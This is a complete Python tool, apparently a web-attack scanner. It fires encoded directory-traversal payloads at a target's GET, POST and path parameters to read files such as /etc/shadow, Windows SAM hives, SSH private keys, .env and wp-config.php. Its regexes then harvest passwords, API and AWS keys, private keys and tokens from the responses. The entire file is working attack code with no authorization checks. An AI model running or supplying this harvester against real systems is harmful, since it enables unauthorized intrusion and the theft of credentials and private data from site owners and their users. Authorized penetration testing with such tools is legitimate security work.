#!/usr/bin/env python3
"""
Advanced Directory Traversal Data Hunter - Data Exposure Discovery Tool
Targets configuration files, databases, and sensitive documents through path traversal
"""

import requests
import threading
import time
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, quote, unquote
from datetime import datetime
import os
import base64

class DirectoryTraversalHunter:
    def __init__(self, target_url, threads=20, timeout=10):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.findings = []
        
        # Directory traversal payloads
        self.traversal_payloads = [
            '../',
            '../../',
            '../../../',
            '../../../../',
            '../../../../../',
            '../../../../../../',
            '../../../../../../../',
            '../../../../../../../../',
            '../../../../../../../../../',
            '../../../../../../../../../../',
            # Encoded versions
            '%2e%2e%2f',
            '%2e%2e/',
            '..%2f',
            '..%5c',
            '%252e%252e%252f',
            '%c0%ae%c0%ae%c0%af',
            # Double encoding
            '%252e%252e%252f',
            '%25252e%25252e%25252f',
            # Unicode encoding
            '%c1%1c',
            '%c0%ae',
            # Different separators
            '..\\',
            '..\\..\\',
            '..\\..\\..\\',
            # URL encoding variations
            '....%2f',
            '....%5c',
            '..../',
            '....\\',
            # Mixed encoding
            '..%252f',
            '..%255c',
            # 16-bit Unicode
            '%uff0e%uff0e%uff0f',
            # UTF-8 encoding
            '%e0%80%ae%e0%80%ae%e0%80%af',
            # Overlong UTF-8
            '%c0%2e%c0%2e%c0%2f',
            # Double URL encoding
            '%252e%252e%252f',
            '%25252e%25252e%25252f'
        ]
        
        # High-value target files
        self.target_files = {
            'Linux System Files': [
                'etc/passwd',
                'etc/shadow',
                'etc/hosts',
                'etc/group',
                'etc/issue',
                'etc/motd',
                'etc/fstab',
                'etc/crontab',
                'etc/sudoers',
                'proc/version',
                'proc/cmdline',
                'proc/meminfo',
                'proc/cpuinfo',
                'proc/self/environ',
                'proc/self/cmdline',
                'proc/self/stat',
                'root/.bash_history',
                'home/*/.*_history',
                'var/log/auth.log',
                'var/log/syslog',
                'var/log/messages'
            ],
            'Windows System Files': [
                'windows/system32/drivers/etc/hosts',
                'windows/system32/config/sam',
                'windows/system32/config/system',
                'windows/system32/config/software',
                'windows/win.ini',
                'windows/system.ini',
                'windows/repair/sam',
                'windows/repair/system',
                'boot.ini',
                'autoexec.bat',
                'config.sys'
            ],
            'Application Config Files': [
                '.env',
                '.env.local',
                '.env.production',
                '.env.development',
                'config.php',
                'config.inc.php',
                'config.json',
                'config.xml',
                'config.yaml',
                'config.yml',
                'settings.php',
                'settings.json',
                'settings.xml',
                'database.php',
                'db.php',
                'dbconfig.php',
                'wp-config.php',
                'configuration.php',
                'app.json',
                'app.config',
                'web.config',
                'web.xml',
                'application.properties',
                'hibernate.cfg.xml',
                'struts.xml'
            ],
            'Database Files': [
                'database.sqlite',
                'database.db',
                'data.db',
                'users.db',
                'app.db',
                'backup.sql',
                'dump.sql',
                'database.sql',
                'data.sql',
                'mysql.sql',
                'postgres.sql',
                'db.sqlite3',
                'site.db'
            ],
            'Log Files': [
                'access.log',
                'error.log',
                'debug.log',
                'application.log',
                'app.log',
                'server.log',
                'apache.log',
                'nginx.log',
                'php_errors.log',
                'error_log',
                'logs/access.log',
                'logs/error.log',
                'logs/debug.log',
                'log/access.log',
                'log/error.log',
                'var/log/apache2/access.log',
                'var/log/nginx/access.log'
            ],
            'Backup Files': [
                'backup.zip',
                'backup.tar.gz',
                'backup.tar',
                'site.zip',
                'www.zip',
                'web.zip',
                'database.zip',
                'db.zip',
                'backup.sql.gz',
                'dump.tar.gz',
                'site.tar.gz',
                'backup.bak',
                'database.bak',
                'config.bak',
                'web.bak'
            ],
            'SSH Keys': [
                'root/.ssh/id_rsa',
                'root/.ssh/id_dsa',
                'root/.ssh/authorized_keys',
                'home/*/.ssh/id_rsa',
                'home/*/.ssh/id_dsa',
                'home/*/.ssh/authorized_keys',
                '.ssh/id_rsa',
                '.ssh/id_dsa',
                '.ssh/authorized_keys',
                'Users/*/.ssh/id_rsa',
                'Users/*/Documents/id_rsa'
            ],
            'Application Files': [
                'composer.json',
                'package.json',
                'requirements.txt',
                'Gemfile',
                'pom.xml',
                'build.xml',
                'Dockerfile',
                'docker-compose.yml',
                '.htaccess',
                '.htpasswd',
                'robots.txt',
                'sitemap.xml',
                'crossdomain.xml',
                'clientaccesspolicy.xml'
            ],
            'Source Code': [
                'index.php',
                'admin.php',
                'login.php',
                'config.php',
                'database.php',
                'functions.php',
                'common.php',
                'header.php',
                'footer.php',
                'includes/config.php',
                'inc/config.php',
                'lib/config.php',
                'app.py',
                'settings.py',
                'models.py',
                'views.py',
                'urls.py',
                'admin.py'
            ]
        }
        
        # Sensitive data patterns
        self.sensitive_patterns = {
            'Database Credentials': [
                r'(?i)(database|db)[_\s]*(?:host|server|hostname)["\'\s]*[:=]["\'\s]*([^\s"\'<>]+)',
                r'(?i)(database|db)[_\s]*(?:user|username)["\'\s]*[:=]["\'\s]*([^\s"\'<>]+)',
                r'(?i)(database|db)[_\s]*(?:pass|password)["\'\s]*[:=]["\'\s]*([^\s"\'<>]+)',
                r'(?i)mysql[_\s]*(?:user|username|pass|password)["\'\s]*[:=]["\'\s]*([^\s"\'<>]+)'
            ],
            'API Keys': [
                r'(?i)api[_\s]*key["\'\s]*[:=]["\'\s]*([A-Za-z0-9\-_]{20,})',
                r'(?i)secret[_\s]*key["\'\s]*[:=]["\'\s]*([A-Za-z0-9\-_]{20,})',
                r'(?i)access[_\s]*token["\'\s]*[:=]["\'\s]*([A-Za-z0-9\-_]{20,})'
            ],
            'AWS Credentials': [
                r'AKIA[0-9A-Z]{16}',
                r'(?i)aws[_\s]*(?:access[_\s]*key|secret[_\s]*key)["\'\s]*[:=]["\'\s]*([A-Za-z0-9\-_+/=]{20,})'
            ],
            'Private Keys': [
                r'-----BEGIN [A-Z]+ PRIVATE KEY-----',
                r'-----BEGIN RSA PRIVATE KEY-----',
                r'-----BEGIN DSA PRIVATE KEY-----',
                r'-----BEGIN EC PRIVATE KEY-----'
            ],
            'Passwords': [
                r'(?i)password["\'\s]*[:=]["\'\s]*([^\s"\'<>]{6,})',
                r'(?i)passwd["\'\s]*[:=]["\'\s]*([^\s"\'<>]{6,})',
                r'(?i)pwd["\'\s]*[:=]["\'\s]*([^\s"\'<>]{6,})'
            ],
            'JWT Tokens': [
                r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
            ],
            'Email Addresses': [
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            ],
            'URLs': [
                r'https?://[^\s"\'<>]+'
            ],
            'IP Addresses': [
                r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
            ],
            'Hash Values': [
                r'\b[a-f0-9]{32}\b',
                r'\b[a-f0-9]{40}\b',
                r'\b[a-f0-9]{64}\b'
            ]
        }
        
        # Common parameters that might be vulnerable
        self.vulnerable_params = [
            'file', 'filename', 'path', 'page', 'include', 'inc', 'dir', 'folder',
            'document', 'doc', 'load', 'open', 'read', 'view', 'show', 'display',
            'template', 'theme', 'skin', 'style', 'css', 'js', 'script', 'src',
            'resource', 'data', 'content', 'text', 'url', 'uri', 'link', 'href',
            'download', 'get', 'fetch', 'retrieve', 'action', 'cmd', 'exec',
            'import', 'export', 'backup', 'restore', 'config', 'settings'
        ]

    def test_parameter_traversal(self, param):
        """Test directory traversal on a specific parameter"""
        findings = []
        base_url = self.target_url
        
        for category, files in self.target_files.items():
            for target_file in files:
                for payload in self.traversal_payloads:
                    try:
                        # Construct the traversal path
                        traversal_path = payload + target_file
                        
                        # Test different URL structures
                        test_urls = [
                            f"{base_url}?{param}={traversal_path}",
                            f"{base_url}?{param}={quote(traversal_path)}",
                            f"{base_url}/{param}/{traversal_path}",
                            f"{base_url}/index.php?{param}={traversal_path}",
                            f"{base_url}/page.php?{param}={traversal_path}",
                        ]
                        
                        for test_url in test_urls:
                            response = requests.get(test_url, timeout=self.timeout)
                            
                            if response.status_code == 200:
                                finding = self._analyze_traversal_response(
                                    test_url, response, target_file, category, payload, param
                                )
                                if finding:
                                    findings.append(finding)
                                    # If we found one, try a few more files in this category quickly
                                    break
                                    
                    except Exception:
                        pass
                        
        return findings

    def test_direct_traversal(self):
        """Test directory traversal in URL paths directly"""
        findings = []
        
        for category, files in self.target_files.items():
            for target_file in files[:10]:  # Limit to first 10 files per category
                for payload in self.traversal_payloads[:15]:  # Limit payloads for speed
                    try:
                        traversal_path = payload + target_file
                        test_url = f"{self.target_url}/{traversal_path}"
                        
                        response = requests.get(test_url, timeout=self.timeout)
                        
                        if response.status_code == 200:
                            finding = self._analyze_traversal_response(
                                test_url, response, target_file, category, payload, 'direct_path'
                            )
                            if finding:
                                findings.append(finding)
                                
                    except Exception:
                        pass
                        
        return findings

    def test_post_traversal(self):
        """Test directory traversal via POST parameters"""
        findings = []
        
        common_post_params = [
            'file', 'filename', 'path', 'include', 'page', 'document',
            'template', 'view', 'load', 'open', 'read', 'show'
        ]
        
        for param in common_post_params:
            for category, files in self.target_files.items():
                for target_file in files[:5]:  # Limited for POST testing
                    for payload in self.traversal_payloads[:10]:  # Limited payloads
                        try:
                            traversal_path = payload + target_file
                            post_data = {param: traversal_path}
                            
                            response = requests.post(
                                self.target_url, 
                                data=post_data, 
                                timeout=self.timeout
                            )
                            
                            if response.status_code == 200:
                                finding = self._analyze_traversal_response(
                                    self.target_url, response, target_file, 
                                    category, payload, f'post_{param}'
                                )
                                if finding:
                                    findings.append(finding)
                                    
                        except Exception:
                            pass
                            
        return findings

    def _analyze_traversal_response(self, url, response, target_file, category, payload, param):
        """Analyze response for successful directory traversal"""
        content = response.text
        
        # Check response size (empty responses likely not successful)
        if len(content.strip()) < 10:
            return None
            
        # File-specific indicators
        success_indicators = {
            'etc/passwd': ['root:', 'bin:', 'daemon:', 'nobody:'],
            'etc/shadow': ['root:', '$1$', '$6$', '::'],
            'etc/hosts': ['localhost', '127.0.0.1', 'broadcasthost'],
            'etc/group': ['root:', 'wheel:', 'admin:'],
            'web.config': ['<configuration>', '<appSettings>', '<connectionStrings>'],
            'wp-config.php': ['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'wp_'],
            '.env': ['APP_KEY', 'DB_PASSWORD', 'API_KEY', '='],
            'config.php': ['<?php', '$config', 'database', 'password'],
            'id_rsa': ['-----BEGIN', 'PRIVATE KEY', '-----END'],
            'authorized_keys': ['ssh-', 'rsa', 'dsa'],
            'proc/version': ['Linux version', 'gcc version'],
            'proc/cpuinfo': ['processor', 'model name', 'cpu MHz'],
            'boot.ini': ['boot loader', 'operating systems', '[boot loader]']
        }
        
        # Generic file content indicators
        generic_indicators = [
            'root:', 'admin:', 'password', 'secret', 'key', 'token',
            '<?php', '#!/bin/', 'BEGIN', 'END', 'localhost', '127.0.0.1',
            'database', 'config', 'mysql', 'postgresql', 'mongodb'
        ]
        
        content_lower = content.lower()
        
        # Check for specific file indicators
        file_matched = False
        file_basename = os.path.basename(target_file)
        
        if file_basename in success_indicators:
            for indicator in success_indicators[file_basename]:
                if indicator.lower() in content_lower:
                    file_matched = True
                    break
        
        # Check for generic indicators if no specific match
        if not file_matched:
            indicator_count = sum(1 for indicator in generic_indicators if indicator in content_lower)
            if indicator_count < 2:  # Need at least 2 generic indicators
                return None
        
        # Extract sensitive data
        sensitive_data = self._extract_sensitive_data(content)
        
        # Determine severity
        severity = 'Medium'
        business_impact = f'File system access via directory traversal: {target_file}'
        
        if 'passwd' in target_file or 'shadow' in target_file:
            severity = 'Critical'
            business_impact = 'System password file exposed via directory traversal'
        elif 'private key' in content_lower or 'begin' in content_lower:
            severity = 'Critical' 
            business_impact = 'Private keys exposed via directory traversal'
        elif sensitive_data:
            severity = 'High'
            business_impact = f'Sensitive configuration exposed: {", ".join(sensitive_data.keys())}'
        elif category in ['Application Config Files', 'Database Files']:
            severity = 'High'
            business_impact = f'Application configuration exposed via directory traversal'
        
        return {
            'type': 'Directory Traversal',
            'url': url,
            'method': 'GET' if 'post_' not in param else 'POST',
            'parameter': param,
            'target_file': target_file,
            'file_category': category,
            'payload': payload,
            'severity': severity,
            'response_size': len(content),
            'sensitive_data': sensitive_data,
            'response_sample': content[:1000],  # First 1000 chars
            'business_impact': business_impact,
            'details': f'Successfully accessed {target_file} via directory traversal using {payload}'
        }

    def _extract_sensitive_data(self, content):
        """Extract sensitive data from file content"""
        sensitive_data = {}
        
        for category, patterns in self.sensitive_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                if matches:
                    # Clean up matches
                    clean_matches = []
                    for match in matches:
                        if isinstance(match, tuple):
                            # Take the first non-empty group
                            match = next((m for m in match if m), str(match))
                        clean_matches.append(str(match).strip())
                    
                    if clean_matches:
                        if category not in sensitive_data:
                            sensitive_data[category] = {'count': 0, 'samples': []}
                        
                        sensitive_data[category]['count'] += len(clean_matches)
                        sensitive_data[category]['samples'].extend(clean_matches[:3])
        
        return sensitive_data

    def hunt_directory_traversal(self):
        """Main function to hunt for directory traversal vulnerabilities"""
        print(f"[+] Starting directory traversal hunt on {self.target_url}")
        
        all_findings = []
        
        # Test parameter-based traversal
        print(f"[+] Testing parameter-based directory traversal...")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            param_futures = {
                executor.submit(self.test_parameter_traversal, param): param
                for param in self.vulnerable_params
            }
            
            for future in as_completed(param_futures):
                param = param_futures[future]
                try:
                    findings = future.result()
                    if findings:
                        all_findings.extend(findings)
                        print(f"[!] Found {len(findings)} issues via {param} parameter")
                except Exception as e:
                    pass
        
        # Test direct path traversal
        print(f"[+] Testing direct path directory traversal...")
        try:
            direct_findings = self.test_direct_traversal()
            if direct_findings:
                all_findings.extend(direct_findings)
                print(f"[!] Found {len(direct_findings)} issues via direct path traversal")
        except Exception as e:
            print(f"[!] Error in direct traversal testing: {e}")
        
        # Test POST parameter traversal
        print(f"[+] Testing POST parameter directory traversal...")
        try:
            post_findings = self.test_post_traversal()
            if post_findings:
                all_findings.extend(post_findings)
                print(f"[!] Found {len(post_findings)} issues via POST parameters")
        except Exception as e:
            print(f"[!] Error in POST traversal testing: {e}")
        
        self.findings = all_findings
        print(f"[+] Directory traversal hunting completed. Found {len(all_findings)} total vulnerabilities.")
        return all_findings

    def generate_report(self):
        """Generate comprehensive directory traversal report"""
        report = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'summary': {
                'total_findings': len(self.findings),
                'critical_findings': len([f for f in self.findings if f.get('severity') == 'Critical']),
                'high_findings': len([f for f in self.findings if f.get('severity') == 'High']),
                'medium_findings': len([f for f in self.findings if f.get('severity') == 'Medium']),
                'low_findings': len([f for f in self.findings if f.get('severity') == 'Low'])
            },
            'findings': self.findings
        }
        
        # File category breakdown
        category_stats = {}
        for finding in self.findings:
            category = finding.get('file_category', 'Unknown')
            category_stats[category] = category_stats.get(category, 0) + 1
        
        report['file_category_breakdown'] = category_stats
        
        # Parameter breakdown
        param_stats = {}
        for finding in self.findings:
            param = finding.get('parameter', 'Unknown')
            param_stats[param] = param_stats.get(param, 0) + 1
        
        report['parameter_breakdown'] = param_stats
        
        # Sensitive data summary
        sensitive_data_count = 0
        for finding in self.findings:
            sensitive_data = finding.get('sensitive_data', {})
            for category, info in sensitive_data.items():
                sensitive_data_count += info.get('count', 0)
        
        report['sensitive_data_instances'] = sensitive_data_count
        
        # Overall severity
        severities = [f.get('severity', 'Low') for f in self.findings]
        if 'Critical' in severities:
            report['overall_severity'] = 'Critical'
        elif 'High' in severities:
            report['overall_severity'] = 'High'
        elif 'Medium' in severities:
            report['overall_severity'] = 'Medium'
        else:
            report['overall_severity'] = 'Low'
            
        return report

    def save_report(self, filename=None):
        """Save detailed report"""
        if not filename:
            domain = urlparse(self.target_url).netloc.replace('.', '_')
            filename = f"directory_traversal_hunt_{domain}_{int(time.time())}.json"
            
        report = self.generate_report()
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\n[+] Report saved to {filename}")
        return report

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Advanced Directory Traversal Hunter')
    parser.add_argument('url', help='Target URL to test for directory traversal')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('-o', '--output', help='Output file for report')
    
    args = parser.parse_args()
    
    hunter = DirectoryTraversalHunter(args.url, args.threads, args.timeout)
    findings = hunter.hunt_directory_traversal()
    
    print(f"\n{'='*60}")
    print("DIRECTORY TRAVERSAL HUNTING RESULTS")
    print(f"{'='*60}")
    
    if not findings:
        print("[-] No directory traversal vulnerabilities found")
        return
        
    # Group by severity and category
    severity_groups = {}
    category_stats = {}
    
    for finding in findings:
        severity = finding.get('severity', 'Low')
        category = finding.get('file_category', 'Unknown')
        
        if severity not in severity_groups:
            severity_groups[severity] = []
        severity_groups[severity].append(finding)
        
        category_stats[category] = category_stats.get(category, 0) + 1
    
    # Display findings by severity
    for severity in ['Critical', 'High', 'Medium', 'Low']:
        if severity in severity_groups:
            print(f"\n{severity.upper()} SEVERITY FINDINGS:")
            print("-" * 40)
            
            for finding in severity_groups[severity][:3]:  # Show first 3 per severity
                print(f"\n[!] {finding['type']}")
                print(f"    URL: {finding['url']}")
                print(f"    Parameter: {finding['parameter']}")
                print(f"    Target File: {finding['target_file']}")
                print(f"    Category: {finding['file_category']}")
                print(f"    Payload: {finding['payload']}")
                print(f"    Impact: {finding['business_impact']}")
                
                if finding.get('sensitive_data'):
                    print(f"    Sensitive Data Found:")
                    for data_type, info in finding['sensitive_data'].items():
                        print(f"      - {data_type}: {info['count']} instances")
                        if info['samples']:
                            for sample in info['samples'][:2]:
                                print(f"        * {sample[:60]}...")
                                
            if len(severity_groups[severity]) > 3:
                print(f"\n    ... and {len(severity_groups[severity]) - 3} more {severity.lower()} findings")
    
    # Display category summary
    print(f"\nFILE CATEGORIES ACCESSED:")
    print("-" * 30)
    for category, count in category_stats.items():
        print(f"{category}: {count} files")
    
    # Save report
    report = hunter.save_report(args.output)
    print(f"\n[+] Overall Severity: {report['overall_severity']}")
    print(f"[+] Total Files Accessed: {report['summary']['total_findings']}")
    print(f"[+] Sensitive Data Instances: {report['sensitive_data_instances']}")

if __name__ == '__main__':
    main()